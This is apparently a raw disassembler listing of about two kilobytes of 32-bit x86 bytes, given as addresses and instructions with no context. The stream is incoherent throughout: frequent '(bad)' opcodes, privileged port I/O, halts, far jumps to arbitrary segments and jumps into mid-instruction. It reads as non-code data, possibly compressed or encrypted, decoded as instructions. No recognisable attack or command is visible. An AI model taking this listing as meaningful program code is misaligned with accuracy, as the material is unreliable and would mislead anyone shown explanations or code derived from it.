  4155cf:	adc    eax,DWORD PTR [eax-0x1882ab6a]
  4155d5:	out    0x30,eax
  4155d7:	dec    ebx
  4155d8:	ja     0x415597
  4155da:	ins    BYTE PTR es:[edi],dx
  4155db:	ins    BYTE PTR es:[edi],dx
  4155dc:	mov    edx,0x1403d734
  4155e1:	pop    ecx
  4155e2:	inc    esp
  4155e3:	mov    eax,0x3923eaa5
  4155e8:	mov    bl,0xd5
  4155ea:	ret    
  4155eb:	adc    al,0xf4
  4155ed:	fwait
  4155ee:	ror    BYTE PTR [eax-0x1a],1
  4155f1:	push   es
  4155f2:	leave  
  4155f3:	mov    gs,WORD PTR [esi]
  4155f5:	adc    BYTE PTR [edx],al
  4155f7:	or     eax,0x4988cc89
  4155fc:	stc    
  4155fd:	or     BYTE PTR [esi],ah
  4155ff:	daa    
  415600:	aam    0x78
  415602:	cwde   
  415603:	push   ds
  415604:	push   edx
  415605:	out    0xb5,al
  415607:	icebp  
  415608:	ja     0x415636
  41560a:	lods   eax,DWORD PTR ds:[esi]
  41560b:	xchg   edx,eax
  41560c:	shl    DWORD PTR [ecx],1
  41560e:	jno    0x415655
  415610:	rcr    DWORD PTR [esi],0xf1
  415613:	mov    DWORD PTR [ecx-0x3c],ebp
  415616:	repnz inc edi
  415618:	scas   eax,DWORD PTR es:[edi]
  415619:	push   ss
  41561a:	inc    ebx
  41561b:	in     eax,dx
  41561c:	enter  0x5f0b,0x86
  415620:	(bad)  [ebp+0x4f]
  415623:	inc    esi
  415624:	mov    edx,0x8e40207f
  415629:	mov    edi,0xfa9b1d21
  41562e:	stos   DWORD PTR es:[edi],eax
  41562f:	fisttp QWORD PTR [eax-0x6a13f75d]
  415635:	leave  
  415636:	popf   
  415637:	push   ds
  415638:	jno    0x4155e0
  41563a:	ins    BYTE PTR es:[edi],dx
  41563b:	popf   
  41563c:	jo     0x4155fe
  41563e:	out    0xd2,eax
  415640:	sub    dl,bl
  415642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415643:	pop    ecx
  415644:	pop    ebx
  415645:	dec    ebx
  415646:	jmp    0x415642
  415648:	addr16 cvttps2pi mm0,xmm5
  41564c:	cmp    eax,0x553b83de
  415651:	inc    edi
  415652:	fidivr DWORD PTR [eax]
  415654:	sbb    eax,0x7c12f127
  415659:	mul    BYTE PTR [ebp+0x41]
  41565c:	out    0x2e,al
  41565e:	in     eax,dx
  41565f:	xor    DWORD PTR [ebx*8-0x7a2e00c3],edx
  415666:	xchg   esi,eax
  415667:	and    al,0xb1
  415669:	pop    ebx
  41566a:	lock xor al,0x6f
  41566d:	shl    DWORD PTR [eax-0x3a245939],cl
  415673:	and    esp,ebp
  415675:	or     al,BYTE PTR ds:0xa6ac00cb
  41567b:	out    0xad,eax
  41567d:	mov    esi,0x6e6fbb9b
  415682:	fs out 0x2f,eax
  415685:	loope  0x415623
  415687:	dec    edx
  415688:	ficomp DWORD PTR [esi-0x4f8d5493]
  41568e:	pop    eax
  41568f:	les    ebp,FWORD PTR ds:0x324374d3
  415695:	sub    bl,bl
  415697:	push   edx
  415698:	push   0xa1ff66fe
  41569d:	mov    ds:0x1037f7a1,al
  4156a2:	aad    0xc2
  4156a4:	aad    0x74
  4156a6:	mov    ds:0x87338895,eax
  4156ab:	outs   dx,BYTE PTR ds:[esi]
  4156ac:	ins    DWORD PTR es:[edi],dx
  4156ad:	jns    0x4156b0
  4156af:	fidiv  DWORD PTR [edi]
  4156b1:	nop
  4156b2:	mov    esp,0xa3526c3b
  4156b7:	adc    al,0x1c
  4156b9:	stos   BYTE PTR es:[edi],al
  4156ba:	pop    esp
  4156bb:	jne    0x415719
  4156bd:	cmp    ah,BYTE PTR [esi-0x6e]
  4156c0:	push   esp
  4156c1:	mov    eax,0x319c319
  4156c6:	data16 jl 0x415733
  4156c9:	(bad)  [esi-0x6fa70615]
  4156cf:	stc    
  4156d0:	in     al,0x55
  4156d2:	jbe    0x41573d
  4156d4:	mov    al,ds:0xb60a2d37
  4156d9:	addr16 aad 0x9a
  4156dc:	retf   0xeca0
  4156df:	sub    eax,0xd54e1b25
  4156e4:	push   cs
  4156e5:	stos   BYTE PTR es:[edi],al
  4156e6:	dec    eax
  4156e7:	pop    esp
  4156e8:	ds hlt 
  4156ea:	push   0x14cf44c9
  4156ef:	and    BYTE PTR [ebx],cl
  4156f1:	cmp    eax,ecx
  4156f3:	jge    0x415770
  4156f5:	xchg   di,ax
  4156f7:	cmp    BYTE PTR [edi+0x18],dh
  4156fa:	js     0x4156fe
  4156fc:	test   eax,0x9a4be5c9
  415701:	ficom  DWORD PTR [ecx+0x436d159f]
  415707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415708:	adc    eax,0xfcf7ae04
  41570d:	jp     0x4156ae
  41570f:	fdiv   QWORD PTR [edx]
  415711:	(bad)  
  415712:	adc    eax,0xc5f2c786
  415717:	into   
  415718:	and    esi,DWORD PTR [ecx]
  41571a:	sub    al,0x9f
  41571c:	sub    BYTE PTR [ebx+0x76a1a850],0x9c
  415723:	clc    
  415724:	pop    esp
  415725:	fsubr  QWORD PTR [edi-0x60]
  415728:	sbb    bl,dh
  41572a:	in     eax,0x3d
  41572c:	repz ficom DWORD PTR [eax-0x52ea67e0]
  415733:	icebp  
  415734:	add    BYTE PTR ds:0x515dc936,cl
  41573a:	dec    ecx
  41573b:	xchg   ebp,eax
  41573c:	aas    
  41573d:	add    edi,DWORD PTR [esi]
  41573f:	xor    BYTE PTR [ebx-0x6],0x88
  415743:	cmp    BYTE PTR [ebx+ebx*8],cl
  415746:	(bad)  
  415747:	call   0xb50c76a0
  41574c:	jnp    0x4156ec
  41574e:	loop   0x415789
  415750:	pop    es
  415751:	jnp    0x4156fe
  415753:	into   
  415754:	xchg   esi,eax
  415755:	shl    BYTE PTR [esi],cl
  415757:	in     al,dx
  415758:	repnz out 0x44,al
  41575b:	sub    al,0xe6
  41575d:	xchg   DWORD PTR [esi+0x44978a20],ecx
  415763:	scas   al,BYTE PTR es:[edi]
  415764:	push   es
  415765:	mov    eax,0xe455ba3f
  41576a:	gs jns 0x415753
  41576d:	aas    
  41576e:	pop    esi
  41576f:	imul   esp,esp,0x4a
  415772:	ret    0x65b1
  415775:	inc    esp
  415776:	in     al,dx
  415777:	nop
  415778:	push   edi
  415779:	inc    eax
  41577a:	pop    esi
  41577b:	loope  0x4157a3
  41577d:	mov    ah,BYTE PTR [ecx+0x460af994]
  415783:	mov    ecx,0x3e1f1248
  415788:	push   esp
  415789:	dec    ebp
  41578a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578b:	jno    0x415726
  41578d:	mov    DWORD PTR [ebx-0x55bc1552],0x39410b77
  415797:	sbb    edi,ebx
  415799:	pop    edi
  41579a:	add    DWORD PTR [edx+0x5112254],ecx
  4157a0:	push   ebp
  4157a1:	or     DWORD PTR [ebx],esi
  4157a3:	push   cs
  4157a4:	xchg   esi,eax
  4157a5:	dec    ecx
  4157a6:	mov    DWORD PTR [eax],0x7a5fe527
  4157ac:	xor    ecx,edx
  4157ae:	je     0x4157b6
  4157b0:	fnsave [edi]
  4157b2:	lods   al,BYTE PTR ds:[esi]
  4157b3:	clc    
  4157b4:	test   BYTE PTR [edi+0x61d201f1],dl
  4157ba:	in     al,0x1d
  4157bc:	popf   
  4157bd:	pop    edx
  4157be:	je     0x415806
  4157c0:	out    dx,al
  4157c1:	lods   eax,DWORD PTR ds:[esi]
  4157c2:	icebp  
  4157c3:	and    eax,0x4556f7cc
  4157c8:	mov    ecx,0xc70b99ea
  4157cd:	ja     0x415823
  4157cf:	dec    DWORD PTR fs:[ecx-0x42f57fcf]
  4157d6:	rcr    ah,1
  4157d8:	ss pusha 
  4157da:	sub    ah,ah
  4157dc:	mov    eax,0xfb358278
  4157e1:	ficomp DWORD PTR [ecx]
  4157e3:	(bad)  
  4157e4:	cwde   
  4157e5:	popa   
  4157e6:	retf   
  4157e7:	mov    ds,edx
  4157e9:	cli    
  4157ea:	jb     0x415778
  4157ec:	jle    0x415805
  4157ee:	push   ecx
  4157ef:	or     eax,0xb3d7580d
  4157f4:	lods   al,BYTE PTR ds:[esi]
  4157f5:	bnd je 0x415783
  4157f8:	data16 sahf 
  4157fa:	shl    BYTE PTR [edx],1
  4157fc:	(bad)  
  4157fd:	mov    ds:0x1b155e51,al
  415802:	ret    
  415803:	jo     0x4157a1
  415805:	cmp    eax,0xf34ac473
  41580a:	not    BYTE PTR [ecx]
  41580c:	adc    ebx,DWORD PTR [esi+esi*4-0x309b388f]
  415813:	outs   dx,DWORD PTR ds:[esi]
  415814:	shr    BYTE PTR [esi],0x3f
  415817:	inc    esp
  415818:	xchg   esp,eax
  415819:	fwait
  41581a:	or     dl,bl
  41581c:	test   ebx,esp
  41581e:	pop    es
  41581f:	int3   
  415820:	lods   al,BYTE PTR ds:[esi]
  415821:	pop    es
  415822:	outs   dx,BYTE PTR ds:[esi]
  415823:	cmp    DWORD PTR [edi],ebp
  415825:	cmp    BYTE PTR [eax-0x45],ah
  415828:	inc    ebx
  415829:	popf   
  41582a:	ror    BYTE PTR gs:[ecx+0x19],0x19
  41582f:	dec    edx
  415830:	fisttp DWORD PTR ds:0x3d72fbbe
  415836:	and    al,ah
  415838:	addr16 sub al,0xc2
  41583b:	or     al,0xb0
  41583d:	xchg   ebx,eax
  41583e:	jb     0x41587d
  415840:	sbb    eax,0x6697be1f
  415845:	pop    ds
  415846:	cmp    edx,DWORD PTR [edx+0x28]
  415849:	sub    ah,cl
  41584b:	push   edx
  41584c:	adc    DWORD PTR [edx],esp
  41584e:	mov    dh,0xf1
  415850:	call   0x7537e20b
  415855:	das    
  415856:	dec    DWORD PTR ds:0xee2a12a9
  41585c:	bound  ecx,QWORD PTR [eax-0x3efa65ea]
  415862:	pop    eax
  415863:	loop   0x4157fd
  415865:	stc    
  415866:	repnz lods al,BYTE PTR ds:[esi]
  415868:	xchg   edi,eax
  415869:	in     al,dx
  41586a:	outs   dx,BYTE PTR ds:[esi]
  41586b:	(bad)  
  41586c:	jns    0x4158a1
  41586e:	jecxz  0x415829
  415870:	out    0xa6,al
  415872:	dec    esp
  415873:	mov    dl,0x5e
  415875:	jno    0x4158a5
  415877:	push   ds
  415878:	popf   
  415879:	xor    al,0x4c
  41587b:	adc    DWORD PTR [edx],0x2
  41587e:	adc    esp,DWORD PTR [ebx]
  415880:	push   es
  415881:	cwde   
  415882:	mov    bh,0x22
  415884:	mov    ah,0xbe
  415886:	std    
  415887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415888:	dec    edx
  415889:	fcmovnb st,st(2)
  41588b:	popf   
  41588c:	lods   al,BYTE PTR ds:[esi]
  41588d:	mov    ds:0xfc058155,al
  415892:	jmp    0x415903
  415894:	mov    eax,ds:0x99d627b8
  415899:	jne    0x4158cf
  41589b:	ja     0x415865
  41589d:	cmove  ebx,DWORD PTR [edx]
  4158a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a1:	loope  0x415830
  4158a3:	fcomp  QWORD PTR [edx+0xd]
  4158a6:	retf   0x2575
  4158a9:	jo     0x41585e
  4158ab:	lea    edi,[ebx]
  4158ad:	dec    esp
  4158ae:	gs xchg ebx,eax
  4158b0:	int    0x68
  4158b2:	add    DWORD PTR [ecx],ecx
  4158b4:	mov    eax,0x52018c79
  4158b9:	enter  0x6449,0x42
  4158bd:	sub    BYTE PTR [edx-0x70],0x7d
  4158c1:	push   eax
  4158c2:	cmp    DWORD PTR [ecx],0xffffffd4
  4158c5:	add    esp,DWORD PTR ds:0x3e393a8c
  4158cb:	sbb    bh,BYTE PTR [esi+eiz*1]
  4158ce:	test   BYTE PTR [ecx+0x27],0xe6
  4158d2:	cmp    ch,bh
  4158d4:	jge    0x4158c5
  4158d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d7:	xchg   BYTE PTR [esi-0x52],cl
  4158da:	xor    eax,esi
  4158dc:	data16 add cl,BYTE PTR [eax]
  4158df:	xor    BYTE PTR ds:0xcf2f574c,dl
  4158e5:	outs   dx,BYTE PTR ds:[esi]
  4158e6:	push   cs
  4158e7:	and    ecx,ebx
  4158e9:	mov    bl,0x77
  4158eb:	dec    ecx
  4158ec:	sbb    DWORD PTR [edx+esi*8+0x724488ea],ebx
  4158f3:	push   esp
  4158f4:	sahf   
  4158f5:	pusha  
  4158f6:	sub    DWORD PTR [edx+0x4e71ecaf],ebx
  4158fc:	jnp    0x4158d9
  4158fe:	mov    al,ds:0x6fbfebf3
  415903:	adc    ecx,DWORD PTR [edx-0x70]
  415906:	dec    ecx
  415907:	mov    WORD PTR [esp+eiz*8-0x4c],fs
  41590b:	inc    edx
  41590c:	sbb    eax,0x846cdf7c
  415911:	sti    
  415912:	adc    ebx,esi
  415914:	ror    DWORD PTR [esi-0x62e82ea5],0x2c
  41591b:	add    eax,0xb4a68e2f
  415920:	inc    ebp
  415921:	jb     0x41591b
  415923:	fwait
  415924:	mov    esp,0x625f4ed3
  415929:	fnsave [ebp+0x645a2aaa]
  41592f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415930:	jno    0x415940
  415932:	fst    QWORD PTR [ecx]
  415934:	and    esp,DWORD PTR [edi+0x58]
  415937:	xor    DWORD PTR [eax-0x5a],edi
  41593a:	shr    BYTE PTR [ebp-0x1d0f2221],1
  415940:	out    0x38,eax
  415942:	pop    es
  415943:	cmp    eax,0xb0417087
  415948:	mov    edi,0xd509bc8a
  41594d:	imul   esp,DWORD PTR [ebp+0x18],0x4e
  415951:	lea    esi,gs:[edi+ebp*2+0x32c3d01a]
  415959:	inc    esp
  41595a:	std    
  41595b:	retf   
  41595c:	fnstsw WORD PTR [eax]
  41595e:	sahf   
  41595f:	sar    dl,0x4c
  415962:	cmp    dh,0x4a
  415965:	jl     0x41595b
  415967:	pop    ebp
  415968:	sar    DWORD PTR [ecx-0x41a21767],cl
  41596e:	ret    
  41596f:	ja     0x415919
  415971:	dec    ebp
  415972:	push   0xb3b355d7
  415977:	cmp    dh,BYTE PTR [esp+ebx*1-0x1b]
  41597b:	push   eax
  41597c:	inc    edx
  41597d:	out    0x5a,eax
  41597f:	jbe    0x4159d2
  415981:	int    0x7a
  415983:	fimul  DWORD PTR [esi+0x2d5d12ce]
  415989:	dec    ebp
  41598a:	or     al,0x7a
  41598c:	aas    
  41598d:	je     0x415917
  41598f:	hlt    
  415990:	push   ecx
  415991:	xor    edi,DWORD PTR [ebx+edi*1+0x40]
  415995:	leave  
  415996:	dec    edx
  415997:	pop    edi
  415998:	cdq    
  415999:	jg     0x41592b
  41599b:	adc    bh,BYTE PTR [edx-0x7edcc25f]
  4159a1:	js     0x415954
  4159a3:	and    al,0x1a
  4159a5:	dec    esp
  4159a6:	test   DWORD PTR [edx-0x74fff479],edi
  4159ac:	ret    0xb9ef
  4159af:	pop    edx
  4159b0:	aad    0xff
  4159b2:	pop    ebx
  4159b3:	inc    ebp
  4159b4:	push   ebx
  4159b5:	and    eax,DWORD PTR [edi-0x60]
  4159b8:	add    eax,0x1b6ce1f3
  4159bd:	or     eax,0x9fdb1396
  4159c2:	or     BYTE PTR [eax+esi*4-0x32291dc2],dl
  4159c9:	xor    eax,0x52a14fc4
  4159ce:	add    al,0x71
  4159d0:	scas   al,BYTE PTR es:[edi]
  4159d1:	dec    edi
  4159d2:	into   
  4159d3:	push   edx
  4159d4:	lahf   
  4159d5:	out    0xa3,al
  4159d7:	jno    0x41597b
  4159d9:	out    dx,al
  4159da:	das    
  4159db:	sbb    esp,DWORD PTR [esi+eiz*2+0x4d1ce44f]
  4159e2:	or     al,0x40
  4159e4:	mov    ds,WORD PTR [esp+ebx*4]
  4159e7:	xchg   esp,eax
  4159e8:	in     al,0x56
  4159ea:	sbb    al,0x51
  4159ec:	das    
  4159ed:	xor    al,0x76
  4159ef:	cs jmp 0xe757:0x7f20d20c
  4159f7:	inc    eax
  4159f8:	js     0x41599b
  4159fa:	das    
  4159fb:	fcomp  DWORD PTR gs:[edx+ebx*2+0x4]
  415a00:	sbb    eax,0x4d96318
  415a05:	test   DWORD PTR [ebx-0x769bdfea],0xb9b17fc9
  415a0f:	lahf   
  415a10:	das    
  415a11:	xchg   edx,eax
  415a12:	cld    
  415a13:	and    eax,0x3c517649
  415a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a19:	mov    dh,0xff
  415a1b:	sub    ebx,DWORD PTR [edx+edx*8+0x30]
  415a1f:	xchg   ecx,eax
  415a20:	mov    ch,0x62
  415a22:	jmp    0xa6d019c5
  415a27:	leave  
  415a28:	xor    eax,0x4fa9d2f3
  415a2d:	jns    0x415a7f
  415a2f:	aad    0x8c
  415a31:	pop    edi
  415a32:	test   BYTE PTR [esi+edi*4-0x6b],0x61
  415a37:	push   ecx
  415a38:	outs   dx,BYTE PTR ds:[esi]
  415a39:	pop    edi
  415a3a:	mov    ebx,0xd39522ab
  415a3f:	cdq    
  415a40:	inc    ecx
  415a41:	or     BYTE PTR ds:0x126f9cb0,ah
  415a47:	mov    bl,0xf3
  415a49:	(bad)  
  415a4a:	mov    WORD PTR [edx-0x52b9edd7],?
  415a50:	push   esi
  415a51:	xor    BYTE PTR [edx],ah
  415a53:	push   eax
  415a54:	mov    bh,0x8d
  415a56:	xor    ah,BYTE PTR [esp+ebx*2+0x685d754d]
  415a5d:	and    BYTE PTR [ecx],0x1
  415a60:	inc    ecx
  415a61:	inc    ecx
  415a62:	adc    BYTE PTR [edi+eiz*1+0x0],cl
  415a66:	add    DWORD PTR [esi-0x7d],ebp
  415a69:	jbe    0x415ac7
  415a6b:	dec    edx
  415a6c:	push   ebx
  415a6d:	mov    ch,0xef
  415a6f:	mov    al,ds:0xdd4d0924
  415a74:	pushf  
  415a75:	xor    BYTE PTR [esi+ecx*4+0x4b77f825],bh
  415a7c:	pop    ss
  415a7d:	and    BYTE PTR [ebp+0x47f9303d],ah
  415a83:	xchg   esi,eax
  415a84:	xchg   edi,eax
  415a85:	jge    0x415abe
  415a87:	les    ecx,FWORD PTR [ebx-0x9]
  415a8a:	push   ecx
  415a8b:	or     cl,bl
  415a8d:	ins    DWORD PTR es:[edi],dx
  415a8e:	inc    esi
  415a8f:	mov    al,0x0
  415a91:	push   cs
  415a92:	cmp    ah,BYTE PTR [ebx+ebx*1]
  415a95:	and    al,0xea
  415a97:	repz xor eax,DWORD PTR [eax-0x4f]
  415a9b:	pop    ecx
  415a9c:	adc    bl,BYTE PTR [esi]
  415a9e:	mov    ebp,0x2c7e89f9
  415aa3:	or     eax,0xf47a5712
  415aa8:	jbe    0x415a5a
  415aaa:	push   cs
  415aab:	xlat   BYTE PTR ds:[ebx]
  415aac:	sbb    ecx,ecx
  415aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aaf:	stos   DWORD PTR es:[edi],eax
  415ab0:	lods   eax,DWORD PTR ds:[esi]
  415ab1:	sub    BYTE PTR [ebx+0x6344b740],ah
  415ab7:	sub    ch,BYTE PTR [esi-0x18]
  415aba:	mov    ds:0x55e22a8f,eax
  415abf:	into   
  415ac0:	dec    ecx
  415ac1:	aas    
  415ac2:	xchg   edi,esi
  415ac4:	xor    al,0xe5
  415ac6:	push   eax
  415ac7:	xor    cl,dh
  415ac9:	pop    ecx
  415aca:	push   cs
  415acb:	dec    edx
  415acc:	inc    eax
  415acd:	add    ch,BYTE PTR fs:[esi]
  415ad0:	push   esi
  415ad1:	out    0x44,al
  415ad3:	fdiv   QWORD PTR [edi-0x19a57265]
  415ad9:	mov    ds:0xeebf4093,eax
  415ade:	stos   BYTE PTR es:[edi],al
  415adf:	aad    0xa0
  415ae1:	add    bl,BYTE PTR [ecx+0x7a]
  415ae4:	pop    esp
  415ae5:	arpl   WORD PTR [ebx],sp
  415ae7:	clc    
  415ae8:	sbb    ebx,DWORD PTR [ecx-0x24]
  415aeb:	bound  esi,QWORD PTR [esi-0x1e]
  415aee:	mov    ch,BYTE PTR [esi]
  415af0:	loope  0x415af0
  415af2:	outs   dx,DWORD PTR ds:[esi]
  415af3:	int3   
  415af4:	mov    ah,0x66
  415af6:	mov    dl,cl
  415af8:	mov    esp,0x9762c39e
  415afd:	into   
  415afe:	push   ds
  415aff:	jg     0x415acb
  415b01:	xor    bl,BYTE PTR [esi+0x6c62238]
  415b07:	push   ebx
  415b08:	mov    edi,0x638b35aa
  415b0d:	test   BYTE PTR [esi],bl
  415b0f:	pop    es
  415b10:	fsub   QWORD PTR [eax-0x7a1acd32]
  415b16:	mov    al,ds:0x2d3b778d
  415b1b:	scas   eax,DWORD PTR es:[edi]
  415b1c:	nop
  415b1d:	dec    esp
  415b1e:	jle    0x415af7
  415b20:	ja     0x415af8
  415b22:	aad    0x99
  415b24:	mov    dl,0x73
  415b26:	in     al,0x36
  415b28:	sbb    eax,0xdb523c22
  415b2d:	in     eax,0xdc
  415b2f:	rcl    DWORD PTR [ebx+0x69],0x3d
  415b33:	bound  ecx,QWORD PTR [edi+0x7a9b77a3]
  415b39:	mov    eax,ds:0x89b10f16
  415b3e:	pusha  
  415b3f:	sub    al,0xfa
  415b41:	or     bh,BYTE PTR [ebx+0xd]
  415b44:	xor    eax,0x5a16ac89
  415b49:	leave  
  415b4a:	push   ebx
  415b4b:	cli    
  415b4c:	fwait
  415b4d:	mov    bl,0x91
  415b4f:	push   es
  415b50:	je     0x415b24
  415b52:	fistp  QWORD PTR [edx]
  415b54:	mov    ah,al
  415b56:	push   ds
  415b57:	sbb    esp,esi
  415b59:	cmp    DWORD PTR [esp+eiz*4+0x5c],0x68
  415b5e:	add    eax,0x32074baf
  415b63:	jp     0x415b60
  415b65:	jge    0x415b6a
  415b67:	imul   eax,DWORD PTR [edi+0x4db76d46],0x43
  415b6e:	ins    BYTE PTR es:[edi],dx
  415b6f:	dec    esp
  415b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b71:	std    
  415b72:	sbb    cl,BYTE PTR [esi]
  415b74:	out    0xe7,eax
  415b76:	in     al,dx
  415b77:	bound  esi,QWORD PTR [ebp-0x68f2aadf]
  415b7d:	push   es
  415b7e:	jbe    0x415be3
  415b80:	sub    DWORD PTR [edi],0xffffff96
  415b83:	inc    ebp
  415b84:	push   cs
  415b85:	xchg   esp,eax
  415b86:	retf   0x202a
  415b89:	push   edx
  415b8a:	dec    ebx
  415b8b:	sub    al,0x1f
  415b8d:	dec    esi
  415b8e:	and    DWORD PTR ds:0x37ba35fe,edx
  415b94:	imul   ecx,DWORD PTR [ebx-0x3a],0x2f
  415b98:	push   edx
  415b99:	jg     0x415b6d
  415b9b:	mul    esi
  415b9d:	ins    BYTE PTR es:[edi],dx
  415b9e:	jecxz  0x415b28
  415ba0:	mov    ah,0x75
  415ba2:	dec    esp
  415ba3:	out    0x5e,al
  415ba5:	ror    edx,0x77
  415ba8:	adc    BYTE PTR [ebx],0x5b
  415bab:	popfw  
  415bad:	jmp    0xb38:0xb2487c91
  415bb4:	and    al,0xef
  415bb6:	loop   0x415b4f
  415bb8:	inc    ebp
  415bb9:	sub    eax,0x6fe3e51b
  415bbe:	pop    es
  415bbf:	rcr    DWORD PTR [esp+ecx*1],0xa4
  415bc3:	lahf   
  415bc4:	fst    DWORD PTR [ecx-0x2eb04c4e]
  415bca:	jno    0x415c1c
  415bcc:	push   ss
  415bcd:	mov    ds:0xbac2b74a,al
  415bd2:	cmp    eax,0x7f0ac653
  415bd7:	sti    
  415bd8:	xchg   edi,eax
  415bd9:	or     eax,0x4981d8da
  415bde:	jbe    0x415c19
  415be0:	int3   
  415be1:	aas    
  415be2:	push   cs
  415be3:	dec    eax
  415be4:	fdiv   st(7),st
  415be6:	xor    ah,al
  415be8:	jl     0x415bf8
  415bea:	das    
  415beb:	enter  0x9686,0xe1
  415bef:	add    al,0x13
  415bf1:	sub    dh,BYTE PTR [bp+di-0x16]
  415bf5:	retf   
  415bf6:	xchg   ebp,eax
  415bf7:	iret   
  415bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf9:	push   esi
  415bfa:	dec    eax
  415bfb:	mov    eax,0x972d1678
  415c00:	add    eax,0xeb94e247
  415c05:	xchg   esp,eax
  415c06:	test   eax,0xe67b8b7a
  415c0b:	stos   DWORD PTR es:[edi],eax
  415c0c:	add    BYTE PTR [eax+0x46],0x3b
  415c10:	add    BYTE PTR [edi+0x31],bl
  415c13:	and    eax,0x2edc60a2
  415c18:	ins    DWORD PTR es:[edi],dx
  415c19:	ror    DWORD PTR ds:0x56586a47,cl
  415c1f:	(bad)  
  415c21:	or     BYTE PTR [ecx-0x2b],bh
  415c24:	sub    eax,0xc2df249
  415c29:	int3   
  415c2a:	xchg   BYTE PTR [edx+0x24],ah
  415c2d:	test   eax,0xc1b3486a
  415c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c33:	jl     0x415c25
  415c35:	lds    ebp,FWORD PTR [ebx-0x2cc9aa46]
  415c3b:	sub    ecx,eax
  415c3d:	enter  0x2de3,0xa5
  415c41:	je     0x415c14
  415c43:	out    0x98,eax
  415c45:	int    0x1a
  415c47:	in     al,0x5
  415c49:	add    ecx,DWORD PTR [ebx-0x73]
  415c4c:	sbb    esi,ebp
  415c4e:	adc    eax,0x6d76d895
  415c53:	ss mov ch,0xdf
  415c56:	aad    0x5d
  415c58:	add    ah,BYTE PTR [esi]
  415c5a:	loop   0x415c1f
  415c5c:	sub    ah,BYTE PTR [ebp+0x66d4302f]
  415c62:	add    eax,0x41eb4ef2
  415c67:	pop    ds
  415c68:	ret    
  415c69:	dec    eax
  415c6a:	ficomp DWORD PTR [ebx-0x6c]
  415c6d:	cmp    eax,0x899e878d
  415c72:	ficom  WORD PTR [ebp+0x1d9b0a92]
  415c78:	test   al,0x80
  415c7a:	in     eax,dx
  415c7b:	mov    ah,dh
  415c7d:	aad    0x8
  415c7f:	push   edx
  415c80:	xchg   DWORD PTR [ecx],esp
  415c82:	jmp    0x369fad90
  415c87:	pop    esp
  415c88:	mov    esp,gs
  415c8a:	sub    edi,DWORD PTR [ebx]
  415c8c:	push   esp
  415c8d:	mov    ebp,DWORD PTR [ebp+0x2a]
  415c90:	or     eax,0xa6db3bc0
  415c95:	mov    bh,0x16
  415c97:	add    BYTE PTR [ecx+0x70],dl
  415c9a:	fstp   TBYTE PTR [ecx]
  415c9c:	inc    esi
  415c9d:	or     al,0xa5
  415c9f:	pusha  
  415ca0:	outs   dx,BYTE PTR ds:[esi]
  415ca1:	sti    
  415ca2:	jp     0x415cf2
  415ca4:	out    dx,al
  415ca5:	adc    al,0xc4
  415ca7:	shl    BYTE PTR [edi+0x52],cl
  415caa:	sar    BYTE PTR [ecx],0xab
  415cad:	sub    ecx,edi
  415caf:	inc    edx
  415cb0:	gs rcl ebp,cl
  415cb3:	test   DWORD PTR [ebp-0x7],edi
  415cb6:	fisub  DWORD PTR [eax+0x20]
  415cb9:	je     0x415c8e
  415cbb:	and    al,0x16
  415cbd:	xchg   edx,eax
  415cbe:	cmp    al,0x42
  415cc0:	jmp    0x43b7:0xa04bbae8
  415cc7:	mov    esp,0x5b319262
  415ccc:	push   eax
  415ccd:	sub    edi,DWORD PTR [ebx+0x5a3ba57c]
  415cd3:	jp     0x415cec
  415cd5:	sbb    dh,dh
  415cd7:	sahf   
  415cd8:	xor    al,0xc9
  415cda:	xchg   esp,eax
  415cdb:	stc    
  415cdc:	dec    ecx
  415cdd:	icebp  
  415cde:	adc    esi,DWORD PTR [esi+0x57]
  415ce1:	jnp    0x415d07
  415ce3:	es loopne 0x415cbb
  415ce6:	fdiv   st,st(3)
  415ce8:	xor    DWORD PTR [esi*2-0x427fc051],ecx
  415cef:	push   ebp
  415cf0:	mov    esi,0x4344ec99
  415cf5:	mov    eax,ebp
  415cf7:	shl    BYTE PTR [esi],0x9e
  415cfa:	add    BYTE PTR [edi+0x62],0x34
  415cfe:	js     0x415cc6
  415d00:	mov    esp,0x7b61e914
  415d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d06:	adc    esi,eax
  415d08:	lock sbb DWORD PTR [eax-0x1],esp
  415d0c:	aaa    
  415d0d:	test   BYTE PTR [eax-0x6e9b45e0],bh
  415d13:	mov    eax,0x6664152a
  415d18:	cmp    ebx,eax
  415d1a:	push   ds
  415d1b:	sub    al,0xd5
  415d1d:	(bad)  
  415d1e:	add    DWORD PTR [ebx],0x1f480d67
  415d24:	pushf  
  415d25:	push   es
  415d26:	loop   0x415d79
  415d28:	shl    DWORD PTR [esi],0x30
  415d2b:	(bad)  
  415d2c:	imul   ebp,DWORD PTR [edi+edx*2-0x42d8b97b],0xffffffd6
  415d34:	sahf   
  415d35:	sbb    DWORD PTR [ebp-0x37],eax
  415d38:	mov    ch,0x72
  415d3a:	jne    0x415d4c
  415d3c:	xor    ah,dl
  415d3e:	mov    bh,0x10
  415d40:	rcl    BYTE PTR [ebx+0x23d04c53],1
  415d46:	push   ss
  415d47:	push   edx
  415d48:	xchg   esi,eax
  415d49:	stc    
  415d4a:	mov    eax,0x9b526fe7
  415d4f:	push   ebp
  415d50:	sub    al,BYTE PTR [edx]
  415d52:	xchg   edi,eax
  415d53:	bound  ebp,QWORD PTR [edi-0x45]
  415d56:	pop    edx
  415d57:	sbb    cl,al
  415d59:	addr16 adc bl,0xe5
  415d5d:	imul   ebp,eax,0x4b001af5
  415d63:	nop
  415d64:	iret   
  415d65:	and    bh,dl
  415d67:	push   edi
  415d68:	pop    edx
  415d69:	sub    eax,0xf1bbd7ee
  415d6e:	xchg   edx,eax
  415d6f:	mov    edi,0x3e904304
  415d74:	mov    edx,DWORD PTR [eax-0x38]
